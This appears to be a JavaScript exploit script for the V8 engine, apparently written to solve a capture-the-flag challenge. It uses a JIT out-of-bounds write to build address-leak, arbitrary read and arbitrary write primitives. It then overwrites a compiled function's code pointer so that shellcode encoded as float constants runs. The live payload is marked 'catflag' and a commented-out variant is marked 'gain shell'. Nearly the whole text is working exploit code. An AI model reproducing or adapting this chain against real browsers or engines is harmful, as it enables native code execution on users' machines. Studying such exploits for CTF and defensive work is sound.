var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u8 = new Uint8Array(buf);
var u16 = new Uint16Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);

function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
function f64_to_u32l(val){
    f64[0] = val;
    return u32[0];
}
function f64_to_u32h(val){
    f64[0] = val;
    return u32[1];
}
function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}
function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}

function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}

function u64_to_u32_hi(val){
    u64[0] = val;
    return u32[1];
}


// function stop(){
//     %SystemBreak();
// }

// function p(arg){
//     %DebugPrint(arg);
// }

// function spin(){
//     while(1){};
// }

function hex(str){
    return str.toString(16).padStart(16,0);
}

function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}

function gc() {
    for (let i=0;i<0x10;i++) new ArrayBuffer(0x1000000);
}

function js_heap_defragment() {
    gc();
    for (let i=0;i<0x1000;i++) new ArrayBuffer(0x10);
    for (let i=0;i<0x1000;i++) new Uint32Array(1);
}

// // catflag
const shellcode = () => {return [
    1.0,
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}

// gain shell
// const shellcode = () => {return [
//     1.9553825422107533e-246,
//     1.9560612558242147e-246,
//     1.9995714719542577e-246,
//     1.9533767332674093e-246,
//     2.6348604765229606e-284
// ];}

for(let i = 0; i< 40000; i++){
    shellcode();
}

var double_map_addr = 0x1cb7f9;

function addressOf(object){
    function oob_write(idx,object_){
        let victim_array = [1.1];
        let obj = [object_];

        // 这个运算可以影响对布局，但是原因未知
        idx= idx & 0xff;

        victim_array[idx] = lh_u32_to_f64(f64_to_u32l(victim_array[idx]),double_map_addr);

        return [victim_array,obj,object_];
    }

    for (let i = 0; i < 0x100000; i++) {
        oob_write(0,object);
    }
    let temp = oob_write(4,object);
    let oob_array = temp[1];
    // p(temp);
    // p(oob_array);

    return f64_to_u32l(oob_array[0]);
}


var shellcode_addr = addressOf(shellcode);
logg("shellcode_addr",shellcode_addr);

function AAR(addr){

    function oob_write(idx,addr_){
        for(let i=0; i < 1000000; i++);
        let victim_array = [1.1];
        idx= idx & 0xff;

        f64[0] = victim_array[idx];
        u32[0] = addr_;
        victim_array[idx] = f64[0];
        // victim_array[idx] = lh_u32_to_f64(addr_,0x1000);
        return victim_array;
    }

    for (let i = 0; i < 1000; i++) {
        oob_write(0,addr);
    }
    let temp = oob_write(0x2,addr-8);
    // p(temp);
    return f64_to_u64(temp[0]);
}



// p(shellcode);
var code_addr = u64_to_u32_lo(AAR(shellcode_addr+0xc));
var ins_base = AAR((code_addr)+0x14);
var offset = 0x7en

logg("code_addr",code_addr);
logg("ins_base",ins_base);
logg("rop_base",((ins_base)+offset));

function AAW(addr,val){

    function oob_write(idx,addr_){
        for(let i=0; i < 1000000; i++);
        let victim_array = [1.1];
        idx= idx & 0xff;

        f64[0] = victim_array[idx];
        u32[0] = addr_;
        victim_array[idx] = f64[0];
        // victim_array[idx] = lh_u32_to_f64(addr_,0x1000);
        return victim_array;
    }

    for (let i = 0; i < 1000; i++) {
        oob_write(0,addr);
    }
    let temp = oob_write(0x2,addr-8);
    temp[0] = u64_to_f64(val);
    // p(temp);
}


AAW(code_addr+0x14,(BigInt(ins_base)+offset))

// stop();
shellcode();

// spin();